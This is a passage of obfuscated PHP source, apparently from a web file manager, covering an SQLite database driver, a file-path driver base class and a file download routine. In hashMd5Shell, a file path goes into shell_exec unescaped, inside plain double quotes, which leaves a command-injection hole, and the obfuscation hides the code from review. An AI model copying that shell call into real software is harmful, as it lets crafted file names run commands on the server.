$Ä¨ùŸå =& $_SERVER[¹àö™Ç¾]; if (!class_exists($Ä¨ùŸå[64])) { think_exception(think_lang($Ä¨ùŸå[24]) . $Ä¨ùŸå[65]); } if (!empty($ÖæÛÁ ì)) { if (!isset($ÖæÛÁ ì[$Ä¨ùŸå[26]])) { $ÖæÛÁ ì[$Ä¨ùŸå[26]] = 438; } $this->config = $ÖæÛÁ ì; if (empty($this->config[$Ä¨ùŸå[27]])) { $this->config[$Ä¨ùŸå[27]] = array(); } } } public function connect($º’ÇŒÌ¥ = '', $Áƒ‚ìÃ¯ = 0) { $§µ¢Áù³ =& $_SERVER[¹àö™Ç¾]; if (!isset($this->linkID[$Áƒ‚ìÃ¯])) { if (empty($º’ÇŒÌ¥)) { $º’ÇŒÌ¥ = $this->config; } $this->linkID[$Áƒ‚ìÃ¯] = new SQLite3($º’ÇŒÌ¥[$§µ¢Áù³[31]]); if (!$this->linkID[$Áƒ‚ìÃ¯]) { think_exception($this->linkID[$Áƒ‚ìÃ¯]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Áƒ‚ìÃ¯]->busyTimeout(30000); if (1 != think_config($§µ¢Áù³[32])) { unset($this->config); } } return $this->linkID[$Áƒ‚ìÃ¯]; } public function free() { $this->queryID = null; } public function query($Ôü°“¥Á) { $ŒÂÌ¿ =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ôü°“¥Á; if ($this->queryID) { $this->free(); } think_action_status($ŒÂÌ¿[33], 1); think_status($ŒÂÌ¿[34]); $this->queryID = $this->_linkID->query($Ôü°“¥Á); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¡ĞÙîñ = $this->getAll(); $this->numRows = count($¡ĞÙîñ); return $¡ĞÙîñ; } } public function execute($Å­Œ¾»ª) { $š¾Ğ¯Šå =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Å­Œ¾»ª; if ($this->queryID) { $this->free(); } think_action_status($š¾Ğ¯Šå[35], 1); think_status($š¾Ğ¯Šå[34]); $•¼¸µ§“ = $this->_linkID->exec($Å­Œ¾»ª); $this->debug(); if (!1 === $•¼¸µ§“) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹àö™Ç¾][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æ°“¶ôŞ = $this->_linkID->query($_SERVER[¹àö™Ç¾][37]); if (!$æ°“¶ôŞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $³Ÿ‹Å• = $this->_linkID->query($_SERVER[¹àö™Ç¾][38]); if (!$³Ÿ‹Å•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ûÇ±ö€» = array(); while ($ÌÀ¾ÈÀ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ûÇ±ö€»[] = $ÌÀ¾ÈÀ; } $this->queryID->reset(); return $ûÇ±ö€»; } public function getFields($×½€¥Ëô) { $°‘İµÉ =& $_SERVER[¹àö™Ç¾]; $‘²Ô€äù = $this->query($°‘İµÉ[39] . $×½€¥Ëô . $°‘İµÉ[40]); $ñî£Û†‹ = array(); if ($‘²Ô€äù) { foreach ($‘²Ô€äù as $¶úç¾òÎ => $‘çÄ¬¢Ê) { $ñî£Û†‹[$‘çÄ¬¢Ê[$°‘İµÉ[42]]] = array($°‘İµÉ[42] => $‘çÄ¬¢Ê[$°‘İµÉ[42]], $°‘İµÉ[43] => $‘çÄ¬¢Ê[$°‘İµÉ[43]], $°‘İµÉ[45] => (bool) ($‘çÄ¬¢Ê[$°‘İµÉ[45]] === $°‘İµÉ[22]), $°‘İµÉ[47] => $‘çÄ¬¢Ê[$°‘İµÉ[66]], $°‘İµÉ[49] => (bool) $‘çÄ¬¢Ê[$°‘İµÉ[67]], $°‘İµÉ[52] => (bool) $‘çÄ¬¢Ê[$°‘İµÉ[67]]); } } return $ñî£Û†‹; } public function getTables($íˆæ Ã« = '') { $´­§¡½è =& $_SERVER[¹àö™Ç¾]; $±«ìëÕ = $this->query($´­§¡½è[55] . $´­§¡½è[56] . $´­§¡½è[57]); $ùœû¡ÌÎ = array(); foreach ($±«ìëÕ as $£ÌÂš— => $€şØ›) { $ùœû¡ÌÎ[$£ÌÂš—] = current($€şØ›); } return $ùœû¡ÌÎ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $İáô–°Ÿ =& $_SERVER[¹àö™Ç¾]; $this->error = $this->_linkID->lastErrorMsg(); if ($İáô–°Ÿ[22] != $this->queryStr) { $this->error .= LNG($İáô–°Ÿ[58]) . $this->queryStr; } think_trace($this->error, $İáô–°Ÿ[22], $İáô–°Ÿ[59]); return $this->error; } public function escapeString($Ò­Šşë…) { $à‘Œ€õÀ =& $_SERVER[¹àö™Ç¾]; if ($this->_linkID) { return $this->_linkID->escapeString($Ò­Šşë…); } return str_ireplace($à‘Œ€õÀ[68], $à‘Œ€õÀ[69], $Ò­Šşë…); } public function parseLimit($ùûÀÈ¾¿) { $ÈæºÍŞü =& $_SERVER[¹àö™Ç¾]; $é¹åã÷ = $ÈæºÍŞü[22]; if (!empty($ùûÀÈ¾¿)) { $ùûÀÈ¾¿ = explode($ÈæºÍŞü[60], $ùûÀÈ¾¿); if (count($ùûÀÈ¾¿) > 1) { $é¹åã÷ .= $ÈæºÍŞü[61] . $ùûÀÈ¾¿[1] . $ÈæºÍŞü[62] . $ùûÀÈ¾¿[0] . $ÈæºÍŞü[63]; } else { $é¹åã÷ .= $ÈæºÍŞü[61] . $ùûÀÈ¾¿[0] . $ÈæºÍŞü[63]; } } return $é¹åã÷; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $µêúä­™ =& $_SERVER[¹àö™Ç¾]; $this->objectDriver = array($µêúä­™[70], $µêúä­™[71], $µêúä­™[72], $µêúä­™[73], $µêúä­™[74], $µêúä­™[75], $µêúä­™[76], $µêúä­™[77], $µêúä­™[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($˜‘êÂ³à) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($˜‘êÂ³à, $_SERVER[¹àö™Ç¾][18]); } return $˜‘êÂ³à; } public function iconvApp($¡ÒĞöà) { return $¡ÒĞöà; } public function iconvSystem($â¥˜ÊÜÕ) { return $â¥˜ÊÜÕ; } public function iconvTo($×ÚúÌ‡×, $Î‰Áíš, $¹¶çÙâ–) { $†”«¸Ì =& $_SERVER[¹àö™Ç¾]; if (!$×ÚúÌ‡× || !function_exists($†”«¸Ì[79])) { return $×ÚúÌ‡×; } static $üû¨á›« = array(); $òĞ°í»À = $Î‰Áíš . $†”«¸Ì[80] . $¹¶çÙâ– . $†”«¸Ì[81] . $×ÚúÌ‡×; if (isset($üû¨á›«[$òĞ°í»À])) { return $üû¨á›«[$òĞ°í»À]; } if (function_exists($†”«¸Ì[82])) { $Şøéœ”À = @mb_convert_encoding($×ÚúÌ‡×, $¹¶çÙâ–, $Î‰Áíš); } else { $Şøéœ”À = @iconv($Î‰Áíš, $¹¶çÙâ–, $×ÚúÌ‡×); } $Şøéœ”À = $Şøéœ”À ? $Şøéœ”À : $×ÚúÌ‡×; if (strstr($Şøéœ”À, $†”«¸Ì[83])) { $Şøéœ”À = str_replace($†”«¸Ì[83], $†”«¸Ì[21], $Şøéœ”À); } $üû¨á›«[$Î‰Áíš . $†”«¸Ì[80] . $¹¶çÙâ– . $†”«¸Ì[81] . $×ÚúÌ‡×] = $Şøéœ”À; $üû¨á›«[$¹¶çÙâ– . $†”«¸Ì[80] . $Î‰Áíš . $†”«¸Ì[81] . $×ÚúÌ‡×] = $×ÚúÌ‡×; $üû¨á›«[$¹¶çÙâ– . $†”«¸Ì[80] . $Î‰Áíš . $†”«¸Ì[81] . $Şøéœ”À] = $×ÚúÌ‡×; $üû¨á›«[$Î‰Áíš . $†”«¸Ì[80] . $¹¶çÙâ– . $†”«¸Ì[81] . $Şøéœ”À] = $Şøéœ”À; return $Şøéœ”À; } public function getPathInner($Ø˜š„€Ä) { $½Ó‰…ô = IO::init($Ø˜š„€Ä); return $½Ó‰…ô->path; } public function getPathOuter($¢õ†‰Ãƒ) { $éñ¸©ø =& $_SERVER[¹àö™Ç¾]; $Å¿Õüş = strlen(trim($this->pathBase, $éñ¸©ø[18])); $¢õ†‰Ãƒ = substr(trim($¢õ†‰Ãƒ, $éñ¸©ø[18]), $Å¿Õüş); return $this->pathDriver . $éñ¸©ø[18] . ltrim($¢õ†‰Ãƒ, $éñ¸©ø[18]); } public function isParentOf($÷€±ÄÎ¾, $ıò¿Æ¯) { $ØšÙîÜ« =& $_SERVER[¹àö™Ç¾]; $÷€±ÄÎ¾ = rtrim(strtolower($÷€±ÄÎ¾), $ØšÙîÜ«[18]) . $ØšÙîÜ«[18]; $ıò¿Æ¯ = rtrim(strtolower($ıò¿Æ¯), $ØšÙîÜ«[18]) . $ØšÙîÜ«[18]; $Úƒ¾¨ƒñ = strpos($ıò¿Æ¯, $÷€±ÄÎ¾) === 0; return $Úƒ¾¨ƒñ; } public function getType() { $íÔ™˜ÓÁ =& $_SERVER[¹àö™Ç¾]; $ä¦â†İ„ = str_replace($íÔ™˜ÓÁ[84], $íÔ™˜ÓÁ[22], get_class($this)); return strtolower($ä¦â†İ„); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ª„‡²‰Ç, $¹“Õ¨ÈÎ) { $ï±ËÃñÚ =& $_SERVER[¹àö™Ç¾]; $·²›çˆç = rtrim($ª„‡²‰Ç, $ï±ËÃñÚ[18]) . $ï±ËÃñÚ[18] . $¹“Õ¨ÈÎ; $ğÁæÜ€á = $this->exist($·²›çˆç); return $ğÁæÜ€á ? $·²›çˆç : !1; } public function setModifyTime($ûÖåõ³À, $ç²•Çªé = '') { } public function renameObject($‚Œ¤ó, $õ³ã®½ã) { $¬ª¾­ É =& $_SERVER[¹àö™Ç¾]; $¨İ‚ç = $õ³ã®½ã; Hook::trigger($¬ª¾­ É[85], $this, $‚Œ¤ó, $this, $this->pathFather($‚Œ¤ó) . $õ³ã®½ã); $‚Œ¤ó = $this->getPathOuter($‚Œ¤ó); $õ³ã®½ã = $this->pathFather($‚Œ¤ó) . $õ³ã®½ã; if (IO::isFile($‚Œ¤ó)) { $ô«íòûì = IO::copy($‚Œ¤ó, $this->pathFather($‚Œ¤ó), REPEAT_RENAME_FOLDER, $¨İ‚ç); if ($ô«íòûì) { IO::remove($‚Œ¤ó); } } else { $ô«íòûì = IO::mkdir($õ³ã®½ã); if (!$ô«íòûì) { return !1; } $£„¢ø‚™ = IO::listPath($‚Œ¤ó, !0); $µ…ÙöñÃ = array_merge($£„¢ø‚™[$¬ª¾­ É[86]], $£„¢ø‚™[$¬ª¾­ É[87]]); foreach ($µ…ÙöñÃ as $õŠüÀ) { IO::move($õŠüÀ[$¬ª¾­ É[88]], $õ³ã®½ã, REPEAT_RENAME_FOLDER); } IO::remove($‚Œ¤ó); } return $ô«íòûì ? $õ³ã®½ã : !1; } public function tempFile($Ìè™º±ß = '', $•¸úĞÌœ = '') { if (!$Ìè™º±ß) { $Ìè™º±ß = rand_string(15); } $ˆ×”³ìã = TEMP_FILES . rand_string(15) . $_SERVER[¹àö™Ç¾][18]; @mkdir($ˆ×”³ìã, DEFAULT_PERRMISSIONS, !0); $³âÏƒÁØ = $ˆ×”³ìã . $Ìè™º±ß; @touch($³âÏƒÁØ); if ($•¸úĞÌœ) { file_put_contents($³âÏƒÁØ, $•¸úĞÌœ); } return $³âÏƒÁØ; } public function tempFileRemve($„‘Š¡) { @unlink($„‘Š¡); @rmdir($this->pathFather($„‘Š¡)); } public function mkfile($İ‡àİŒ, $°Ô¾ê‡û = '', $»«Üß²ì = REPEAT_RENAME) { } public function mkdir($¶£à‡Õú, $×¬·åÒ¬ = REPEAT_SKIP) { } public function delFile($¦§‘—ş) { } public function delFolder($¬½ñ¢×•) { } public function copyFile($†¬ßµ™, $“¥Ôûı) { } public function moveFile($Ü”Ä±š, $ˆ¥çÎµŠ) { } public function remove($‰¢á˜Óî) { if ($this->isFile($‰¢á˜Óî)) { return $this->delFile($‰¢á˜Óî); } return $this->delFolder($‰¢á˜Óî); } public function rename($¼§Ñ²€, $éçøÂİ¼) { } public function exist($œÜÕ‹êÕ) { } public function findByHash($ö¼„†ÈÜ = '', $‰‰¹Ë¶‘ = '') { return !1; } public function isFile($ë¶°é©ƒ) { } public function isFolder($÷©õ¦Ó) { } public function size($üªÆØ®) { } public function info($°Âıöîä) { } public function infoSimple($øåéêûˆ) { return $this->info($øåéêûˆ); } public function infoAuth($—ô¶ñàÎ) { return $this->info($—ô¶ñàÎ); } public function infoFull($¶Ü™áÂÌ) { return $this->info($¶Ü™áÂÌ); } public function infoWithChildren($¡òÊ—é…) { $†¦ïæÔù =& $_SERVER[¹àö™Ç¾]; static $¦Ÿü¢³ê = array(); if (isset($¦Ÿü¢³ê[$¡òÊ—é…])) { return $¦Ÿü¢³ê[$¡òÊ—é…]; } $â­³…¤ = $this->info($¡òÊ—é…); if ($â­³…¤ && $â­³…¤[$†¦ïæÔù[43]] == $†¦ïæÔù[89]) { $¯ø½·ôÔ = array($†¦ïæÔù[90] => 0, $†¦ïæÔù[91] => 0, $†¦ïæÔù[92] => 0); $this->infoChildren($¡òÊ—é…, $¯ø½·ôÔ); $â­³…¤[$†¦ïæÔù[90]] = $¯ø½·ôÔ[$†¦ïæÔù[90]]; $â­³…¤[$†¦ïæÔù[93]] = array($†¦ïæÔù[94] => $¯ø½·ôÔ[$†¦ïæÔù[91]], $†¦ïæÔù[95] => $¯ø½·ôÔ[$†¦ïæÔù[92]]); $¦Ÿü¢³ê[$¡òÊ—é…] = $â­³…¤; } return $â­³…¤; } public function listPath($¯™õúÇš, $Ç²Ò¸Êæ = false) { } public function has($©¡Ê®Ù, $¢±±Ù– = false, $û¢óà½¢ = false) { } public function canRead($ÀºÀæ÷Ş) { } public function canWrite($‹¬Õå‚ƒ) { } public function getContent($¥ï²éâí) { } public function setContent($åÂ©Œë¢, $˜¶ÔÈ¯ı = '') { } protected function infoChildren($ÚåÚ¹Ğ„, &$Ü™äğ™ç) { $ğêõÊÉÆ =& $_SERVER[¹àö™Ç¾]; check_abort_echo(); $½œî®¶‚ = $this->listPath($ÚåÚ¹Ğ„, !0); $½œî®¶‚ = array_merge($½œî®¶‚[$ğêõÊÉÆ[87]], $½œî®¶‚[$ğêõÊÉÆ[86]]); foreach ($½œî®¶‚ as $È²ßï”©) { if ($È²ßï”©[$ğêõÊÉÆ[43]] == $ğêõÊÉÆ[89]) { $Ü™äğ™ç[$ğêõÊÉÆ[92]]++; $ğàİáÅ” = $this->getPathInner($È²ßï”©[$ğêõÊÉÆ[88]]); $this->infoChildren($ğàİáÅ”, $Ü™äğ™ç); } else { $Ü™äğ™ç[$ğêõÊÉÆ[91]]++; $Ü™äğ™ç[$ğêõÊÉÆ[90]] += $È²ßï”©[$ğêõÊÉÆ[90]]; } } } public function fileSubstr($„ÊÂ•Úš, $‡¢¬˜‹, $ğƒæ·İÕ) { } public function listAll($–‹Å¾¢¹) { } public function listAllMake($æ·éùè‘, &$Öƒ¤É›) { $ã†İÔ¿Ù =& $_SERVER[¹àö™Ç¾]; check_abort_echo(); $×Ñû“ õ = $this->listPath($æ·éùè‘, !0); if (!$×Ñû“ õ) { return; } $®¢÷ä’ = array_merge($×Ñû“ õ[$ã†İÔ¿Ù[87]], $×Ñû“ õ[$ã†İÔ¿Ù[86]]); foreach ($®¢÷ä’ as $Û´†åˆ) { $ö°Â³‡¼ = $Û´†åˆ[$ã†İÔ¿Ù[43]] == $ã†İÔ¿Ù[89]; $„ìÀÎš = array($ã†İÔ¿Ù[88] => $Û´†åˆ[$ã†İÔ¿Ù[88]], $ã†İÔ¿Ù[89] => $ö°Â³‡¼); if (isset($Û´†åˆ[$ã†İÔ¿Ù[90]])) { $„ìÀÎš[$ã†İÔ¿Ù[90]] = $Û´†åˆ[$ã†İÔ¿Ù[90]]; } if (isset($Û´†åˆ[$ã†İÔ¿Ù[96]])) { $„ìÀÎš[$ã†İÔ¿Ù[96]] = $Û´†åˆ[$ã†İÔ¿Ù[96]]; } if (!$ö°Â³‡¼) { $Öƒ¤É›[] = $„ìÀÎš; continue; } $Öƒ¤É›[] = $„ìÀÎš; $Çü¥§È” = $Û´†åˆ[$ã†İÔ¿Ù[88]]; $ÆÑ“Ê’½ = $this->pathDriver; if (substr($Û´†åˆ[$ã†İÔ¿Ù[88]], 0, strlen($ÆÑ“Ê’½)) == $ÆÑ“Ê’½) { $Çü¥§È” = substr($Çü¥§È”, strlen($ÆÑ“Ê’½)); } $this->listAllMake($Çü¥§È”, $Öƒ¤É›); } } public function listAllSimple($õÏÄÏˆ¦) { $ù´©İ£» =& $_SERVER[¹àö™Ç¾]; $äÙé¿¬ô = array(); $©—ŞÈ©÷ = $this->listAll($õÏÄÏˆ¦); $ıõ¨§°¼ = $this->getPathOuter($õÏÄÏˆ¦); foreach ($©—ŞÈ©÷ as $Ñç·Ä¢æ) { $ÚæşıìÖ = $Ñç·Ä¢æ[$ù´©İ£»[88]]; $õ‘”•—Â = $Ñç·Ä¢æ[$ù´©İ£»[88]]; if (isset($Ñç·Ä¢æ[$ù´©İ£»[97]])) { $ÚæşıìÖ = $Ñç·Ä¢æ[$ù´©İ£»[97]][$ù´©İ£»[88]]; $Ñç·Ä¢æ[$ù´©İ£»[90]] = $Ñç·Ä¢æ[$ù´©İ£»[97]][$ù´©İ£»[90]]; $Ñç·Ä¢æ[$ù´©İ£»[96]] = $Ñç·Ä¢æ[$ù´©İ£»[97]][$ù´©İ£»[96]]; } else { $õ‘”•—Â = substr($Ñç·Ä¢æ[$ù´©İ£»[88]], strlen(get_path_father($ıõ¨§°¼))); $õ‘”•—Â = $ù´©İ£»[18] . ltrim($õ‘”•—Â, $ù´©İ£»[18]); } $ÙÚµåÂè = array($ù´©İ£»[88] => $õ‘”•—Â, $ù´©İ£»[89] => $Ñç·Ä¢æ[$ù´©İ£»[89]]); if (isset($Ñç·Ä¢æ[$ù´©İ£»[90]]) && !$Ñç·Ä¢æ[$ù´©İ£»[89]]) { $ÙÚµåÂè[$ù´©İ£»[90]] = $Ñç·Ä¢æ[$ù´©İ£»[90]]; } if (isset($Ñç·Ä¢æ[$ù´©İ£»[96]])) { $ÙÚµåÂè[$ù´©İ£»[96]] = $Ñç·Ä¢æ[$ù´©İ£»[96]]; } if (!$Ñç·Ä¢æ[$ù´©İ£»[89]]) { $ÙÚµåÂè[$ù´©İ£»[98]] = $ÚæşıìÖ; } $äÙé¿¬ô[] = $ÙÚµåÂè; } return $äÙé¿¬ô; } public function upload($µ«¶™¡ó, $„Ëöá, $½Û¹°é™ = false, $í¨÷à = REPEAT_REPLACE) { } public function uploadFileByID($¿„üú™¦, $È’©À”›, $³Ó˜é) { } public function uploadFileByPath($Ãî¤ÒÌØ, $€ñˆò‡ô, $¯¡åêí = array()) { } public function isUploadServer() { $ÄÑ‘Àø =& $_SERVER[¹àö™Ç¾]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÄÑ‘Àø[99]) { return !0; } return $GLOBALS[$ÄÑ‘Àø[16]][$ÄÑ‘Àø[100]][$ÄÑ‘Àø[101]]; } public function isFileOutServer() { $¬Ëîó·› =& $_SERVER[¹àö™Ç¾]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¬Ëîó·›[99]) { return !0; } return $GLOBALS[$¬Ëîó·›[16]][$¬Ëîó·›[100]][$¬Ëîó·›[102]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¯¨çóƒ) { $àúáí¢® =& $_SERVER[¹àö™Ç¾]; if (!$this->isCdnHost()) { return $¯¨çóƒ; } return str_replace(trim(get_url_root($¯¨çóƒ), $àúáí¢®[18]), trim($this->cdnHost, $àúáí¢®[18]), $¯¨çóƒ); } public function uploadLink($…ğàÒ‡É, $áå×Òô = 0) { $ã½ÑÏçƒ =& $_SERVER[¹àö™Ç¾]; if ($this->isUploadServer()) { return; } $°§ü´Î  = $this->getType(); if (!in_array($°§ü´Î , $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÕÈ‘îÙ“ = 1024 * 1024 * 10; $§à¢†´‹ = $áå×Òô <= $ÕÈ‘îÙ“ ? $ã½ÑÏçƒ[103] : $ã½ÑÏçƒ[104]; $İ¸Øí¶‹ = (!$áå×Òô ? 1 : ceil($áå×Òô / pow(1024, 3))) * 3600 * 4; $ùó¤íœ¤ = $this->{$§à¢†´‹}($…ğàÒ‡É, $İ¸Øí¶‹); if ($ùó¤íœ¤) { $ùó¤íœ¤[$ã½ÑÏçƒ[105]] = $…ğàÒ‡É; $ùó¤íœ¤[$ã½ÑÏçƒ[106]] = $°§ü´Î ; } return $ùó¤íœ¤; } public function uploadFormData($úğ•íÊµ, $Ÿû‰šƒö = 3600) { } public function multiUploadFormData($•á„ÇçÜ, $ÑÈ´å¨á = 3600) { } public function download($ìµÅª¹“, $‡™ÀÒœã) { } public function ext($¡âæ˜§) { $ÑĞÄÜãª =& $_SERVER[¹àö™Ç¾]; if (strpos($¡âæ˜§, $ÑĞÄÜãª[18]) === -1) { $¯ğŞÆç³ = $¡âæ˜§; } else { $¯ğŞÆç³ = $this->pathThis($¡âæ˜§); } $˜ø¾úÅ« = $ÑĞÄÜãª[22]; if (strstr($¯ğŞÆç³, $ÑĞÄÜãª[20])) { $˜ø¾úÅ« = substr($¯ğŞÆç³, strrpos($¯ğŞÆç³, $ÑĞÄÜãª[20]) + 1); $˜ø¾úÅ« = strtolower($˜ø¾úÅ«); } if (strlen($˜ø¾úÅ«) > 3 && preg_match($ÑĞÄÜãª[107], $˜ø¾úÅ«, $¢ñƒÇ´Ö)) { $˜ø¾úÅ« = $ÑĞÄÜãª[22]; } return $˜ø¾úÅ«; } public function pathThis($æõÑ”¬Í) { $üä÷èò× =& $_SERVER[¹àö™Ç¾]; $æõÑ”¬Í = str_replace($üä÷èò×[108], $üä÷èò×[18], rtrim($æõÑ”¬Í, $üä÷èò×[18])); $ÔÑ—Şı° = strrpos($æõÑ”¬Í, $üä÷èò×[18]); if ($ÔÑ—Şı° === !1) { return $æõÑ”¬Í; } return substr($æõÑ”¬Í, $ÔÑ—Şı° + 1); } public function pathFather($ÅƒÍĞõ¬) { $°©Ì¹˜õ =& $_SERVER[¹àö™Ç¾]; $ÅƒÍĞõ¬ = str_replace($°©Ì¹˜õ[108], $°©Ì¹˜õ[18], rtrim($ÅƒÍĞõ¬, $°©Ì¹˜õ[18])); $Æâ¾ãê¿ = strrpos($ÅƒÍĞõ¬, $°©Ì¹˜õ[18]); if ($Æâ¾ãê¿ === !1) { return $°©Ì¹˜õ[22]; } return substr($ÅƒÍĞõ¬, 0, $Æâ¾ãê¿ + 1); } public function hashSimple($Ë÷ÛÇÔ) { $ëÎø‹Ş =& $_SERVER[¹àö™Ç¾]; if (!$Ë÷ÛÇÔ) { return md5($ëÎø‹Ş[22]); } $šÌ·¦É = $this->size($Ë÷ÛÇÔ); $§ÂŸåÎå = 200; $ä¥ùË•ı = 50; if ($šÌ·¦É <= $§ÂŸåÎå * $ä¥ùË•ı) { return $this->hashMd5($Ë÷ÛÇÔ) . $šÌ·¦É; } $õ Ìæ´ = intval($šÌ·¦É / $ä¥ùË•ı); $Í÷†ıè = $ëÎø‹Ş[22]; for ($Ü‚¿ã¼ = 0; $Ü‚¿ã¼ < $ä¥ùË•ı; $Ü‚¿ã¼++) { $Í÷†ıè .= $this->fileSubstr($Ë÷ÛÇÔ, $õ Ìæ´ * $Ü‚¿ã¼, $§ÂŸåÎå); } $Í÷†ıè .= $this->fileSubstr($Ë÷ÛÇÔ, $šÌ·¦É - $§ÂŸåÎå, $§ÂŸåÎå); return md5($Í÷†ıè) . $šÌ·¦É; } public static $md5Cache = array(); public function hashMd5($ĞÇ§Á¤ï) { if (!$ĞÇ§Á¤ï) { return md5($_SERVER[¹àö™Ç¾][22]); } $ĞÇ§Á¤ï = $this->iconvSystem($ĞÇ§Á¤ï); if (isset(self::$md5Cache[$ĞÇ§Á¤ï])) { return self::$md5Cache[$ĞÇ§Á¤ï]; } self::$md5Cache[$ĞÇ§Á¤ï] = $this->hashMd5Shell($ĞÇ§Á¤ï); if (!self::$md5Cache[$ĞÇ§Á¤ï]) { self::$md5Cache[$ĞÇ§Á¤ï] = @md5_file($ĞÇ§Á¤ï); } return self::$md5Cache[$ĞÇ§Á¤ï]; } private function hashMd5Shell($òáãÓèÀ) { $Â¨§Ù€ï =& $_SERVER[¹àö™Ç¾]; if (!$òáãÓèÀ) { return md5($Â¨§Ù€ï[22]); } if (!function_exists($Â¨§Ù€ï[109])) { return !1; } $û¨ÌØßğ = array($Â¨§Ù€ï[110], $Â¨§Ù€ï[111]); $¡Ä‰À = Cache::get($Â¨§Ù€ï[112]); if (!$¡Ä‰À) { $ç¾üÊÒ¶ = BASIC_PATH . $Â¨§Ù€ï[113]; $’İŒ ›á = md5_file($ç¾üÊÒ¶); $¡Ä‰À = $Â¨§Ù€ï[114]; foreach ($û¨ÌØßğ as $îŒÜ¯í) { $Ú³õæ¯‚ = shell_exec($îŒÜ¯í . "\40\x22{$ç¾üÊÒ¶}\42"); if ($Ú³õæ¯‚ && substr(trim($Ú³õæ¯‚), 0, 32) == $’İŒ ›á) { $¡Ä‰À = $îŒÜ¯í; break; } } Cache::set($Â¨§Ù€ï[112], $¡Ä‰À, 3600); } if ($¡Ä‰À == $Â¨§Ù€ï[114]) { return !1; } $Ú³õæ¯‚ = shell_exec($¡Ä‰À . "\40\42{$òáãÓèÀ}\x22"); $Ú³õæ¯‚ = str_replace($Â¨§Ù€ï[115], $Â¨§Ù€ï[22], $Ú³õæ¯‚); return substr($Ú³õæ¯‚, 0, 32); } public function link($ÙÃ÷ôšİ) { return $ÙÃ÷ôšİ; } public function fileOut($’æøÒ—, $…³ÏŒ»œ = false, $®ú±É›ò = false, $Õé“£™µ = '') { $Á€ô†Õ =& $_SERVER[¹àö™Ç¾]; $this->cacheMethod(null, null); if (!$’æøÒ— || !$this->exist($’æøÒ—)) { show_json(LNG($Á€ô†Õ[116]), !1, $®ú±É›ò); } $òÚ€‹Õ’ = $this->getType() == $Á€ô†Õ[117]; $Û¯ÙÎÎ© = $GLOBALS[$Á€ô†Õ[16]][$Á€ô†Õ[100]][$Á€ô†Õ[118]][$Á€ô†Õ[119]]; $¡Æ€¸¦… = (double) $GLOBALS[$Á€ô†Õ[16]][$Á€ô†Õ[100]][$Á€ô†Õ[118]][$Á€ô†Õ[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $û€’Æßß = $this->infoFull($’æøÒ—); $ÒÆã¿èş = $û€’Æßß[$Á€ô†Õ[90]]; $•İšµÔ = gmdate($Á€ô†Õ[121], $û€’Æßß[$Á€ô†Õ[96]]); $ğ£Ÿ±ËÌ = $®ú±É›ò ? $®ú±É›ò : $this->iconvApp($û€’Æßß[$Á€ô†Õ[42]]); $ê¯¹ ¥º = 0; $ŠÖ¸»– = $ÒÆã¿èş - 1; $Å·àå¬€ = $this->ext($ğ£Ÿ±ËÌ); if (in_array($Å·àå¬€, array($Á€ô†Õ[122], $Á€ô†Õ[123], $Á€ô†Õ[124], $Á€ô†Õ[125]))) { $Å·àå¬€ = $Á€ô†Õ[126]; } if (!$Õé“£™µ) { $Õé“£™µ = md5($•İšµÔ . $this->hashSimple($’æøÒ—)); } $Õé“£™µ = $Á€ô†Õ[127] . $Õé“£™µ . $Á€ô†Õ[127]; $•«²Œ¡ç = get_file_mime($Å·àå¬€); if ($…³ÏŒ»œ === !1 && !mime_support($•«²Œ¡ç)) { $…³ÏŒ»œ = !0; $•«²Œ¡ç = $Á€ô†Õ[128]; } header($Á€ô†Õ[129]); header($Á€ô†Õ[130] . $•«²Œ¡ç); $ÚœøÆÚ¸ = rawurlencode($ğ£Ÿ±ËÌ); $ÚœøÆÚ¸ = $Á€ô†Õ[127] . $ÚœøÆÚ¸ . $Á€ô†Õ[131] . $ÚœøÆÚ¸; if ($…³ÏŒ»œ) { header($Á€ô†Õ[132]); header($Á€ô†Õ[133] . $ÚœøÆÚ¸); } else { } header($Á€ô†Õ[134] . gmdate($Á€ô†Õ[121], time() + 3600 * 24 * 30) . $Á€ô†Õ[135]); header($Á€ô†Õ[136]); header($Á€ô†Õ[137]); header($Á€ô†Õ[138]); if (isset($_SERVER[$Á€ô†Õ[139]]) && strtotime($_SERVER[$Á€ô†Õ[139]]) == $û€’Æßß[$Á€ô†Õ[96]]) { header($Á€ô†Õ[140], !0, 304); die; } if (isset($_SERVER[$Á€ô†Õ[141]]) && $_SERVER[$Á€ô†Õ[141]] == $Õé“£™µ) { header($Á€ô†Õ[142] . $Õé“£™µ, !0, 304); die; } header($Á€ô†Õ[142] . $Õé“£™µ); header($Á€ô†Õ[143] . $•İšµÔ . $Á€ô†Õ[135]); header($Á€ô†Õ[144] . $ğ£Ÿ±ËÌ); header($Á€ô†Õ[145]); header($Á€ô†Õ[146] . $ÒÆã¿èş); header($Á€ô†Õ[147]); if (!$…³ÏŒ»œ && $Å·àå¬€ == $Á€ô†Õ[148]) { if ($ÒÆã¿èş > 1024 * 1024 * 5) { die; } 